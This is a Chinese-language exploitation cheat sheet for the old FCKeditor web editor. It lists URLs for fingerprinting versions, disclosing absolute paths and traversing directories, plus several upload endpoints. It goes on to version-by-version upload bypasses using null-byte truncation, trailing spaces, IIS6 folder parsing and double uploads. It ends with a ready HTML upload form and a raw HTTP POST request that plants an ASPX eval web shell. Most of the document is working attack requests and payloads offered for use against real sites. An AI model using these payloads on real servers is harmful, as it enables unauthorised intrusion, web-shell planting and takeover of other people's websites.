# FCKeditor 编辑器漏洞利用

>n年前的总结，如果发现fckeditor这种老古董组件可以使用

## 0x01 查看编辑器版本
* `/fckeditor/editor/dialog/fck_about.html`
* `/ckeditor/CHANGES.html`


## 0x02 编辑器参数

- connecter参数是针对/FCKeditor/editor/filemanager/browser/default/connectors/目录下aspx、php、py...各环境脚本连接文件。(此目录下为关键文件)
- type参数上传类型file、image... 
- Command参数执行相应命令GetFoldersAndFiles...


## 0x03 默认上传文件保存路径

/UserFiles/File(Image...)
## 0x04 爆绝对路径漏洞

- `/FCKeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php`  (支持php的通杀)
- `/FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/aspx/connector.aspx`  (2.5可突破)
- `/FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/shell.asp`


## 0x05遍历目录漏洞

- `/FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=../../`
- Version 2.4.1 测试通过 修改CurrentFolder 参数使用 ../../来进入不同的目录：`/browser/default/connectors/aspx/connector.aspx？Command=CreateFolder&Type=Image&CurrentFolder=../../../&NewFolderName=shell.asp`

根据返回的XML 信息可以查看网站所有的目录，上传地址URL。

- `/FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/`

- `/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/`


## 0x06 上传URI
### (1)test文件的上传地址 
- `FCKeditor/editor/filemanager/browser/default/connectors/test.html`
- `FCKeditor/editor/filemanager/upload/test.html`
- `FCKeditor/editor/filemanager/connectors/test.html`
- `FCKeditor/editor/filemanager/connectors/uploadtest.html`


### (2)brower文件上传地址

- `/FCKeditor/editor/filemanager/browser/default/browser.html?Type=File&Connector=../../connectors/asp/connector.asp`
- `/FCKeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/asp/connector.asp`


## 0x07.突破方式+各版本漏洞
### (1)建立文件夹方法
     (a)利用IIS6.0解析漏洞建立*.asp文件夹，上传图片马或者上传畸形文件
     (b)fckeditor <= 2.6.4 For php 任意文件上传漏洞（iis判定路径有问题，返回500）
     `/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=%2Ftest.php%00.gif` 上传gif图片马即可
### (2)后台无验证
     #### (a)fckeditor 2.x < =2.4.2 For php 在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，可上传任意文件。

     将以下保存为html文件，修改action地址。
 ```
<form id="frmUpload" enctype="multipart/form-data"action="http://www.site.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media" method="post">
    Upload a new file:<br>
    <input type="file" name="NewFile"size="50"/><br>
    <input id="btnUpload" type="submit" value="Upload"/>
</form>
```
     #### (b)fckeditor <= 2.2 允许上传asa、cer、php2、php4、inc、pwml、pht
### (3) 空格绕过

     fckeditor<=2.4.1 提交shell.aspx+空格 绕过 【Windows测试成功】(2.4.1 success)
### (4)二次上传
     fckeditor <= 2.6.8 for asp   运用%00截断，首先上传文件名为shell.asp%00txt，结果为shell.asp_txt，再次上传同名文件，结果为shell(1).asp，成功绕过。

### (5)截断上传
fckeditor <= 2.2.  文件名后截断  shell.asp%00.jpg 直接shell.asp上传成功     
HTTP Request Eg. 
```
POST /FCKeditor/editor/filemanager/upload/aspx/upload.aspx?Type=Image HTTP/1.1
Host: www.**.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://**m/FCKeditor/editor/dialog/fck_image.html?ImageButton
Cookie: ASP.NET_SessionId=kh5lee5aubjpdnpezzhkf4tl; WebPlugValidateCode=7020
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------61051038624293
Content-Length: 264

-----------------------------61051038624293
Content-Disposition: form-data; name="NewFile"; filename="a11.jpg"
Content-Type: image/jpeg

gif89a
<%@ Page Language="Jscript"%><%eval(Request.Item["str"],"unsafe");%>
-----------------------------61051038624293--
```
